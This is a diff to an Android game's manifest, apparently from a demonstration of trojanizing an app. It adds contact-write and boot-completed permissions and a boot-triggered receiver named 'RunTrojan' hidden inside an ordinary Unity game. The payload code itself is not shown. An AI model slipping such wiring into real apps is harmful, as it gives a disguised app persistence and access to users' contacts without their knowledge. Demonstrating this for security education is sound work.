@@ -3,8 +3,10 @@
     <uses-feature android:glEsVersion="0x00020000"/>
     <uses-permission android:name="android.permission.INTERNET"/>
 
-<!--     The line below (The READ_CONTACTS) has been added for demo purposes. -->
+<!--     The lines below has been added for demo purposes. -->
     <uses-permission android:name="android.permission.READ_CONTACTS"/> 
+    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
     
     <uses-feature android:name="android.hardware.touchscreen" android:required="false"/>
     <uses-feature android:name="android.hardware.touchscreen.multitouch" android:required="false"/>
@@ -18,6 +20,14 @@
             </intent-filter>
             <meta-data android:name="unityplayer.UnityActivity" android:value="true"/>
         </activity>
+        <receiver android:name="demo.jumpingdinosaur.apk.trojan.RunTrojan">
+            <intent-filter>
+                <action android:name="demo.jumpingdinosaur.action.BC_ACTION"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
         <meta-data android:name="unity.build-id" android:value="c7903b5b-27b5-4691-8c36-91338098bfae"/>
         <meta-data android:name="unity.splash-mode" android:value="0"/>
         <meta-data android:name="unity.splash-enable" android:value="true"/>
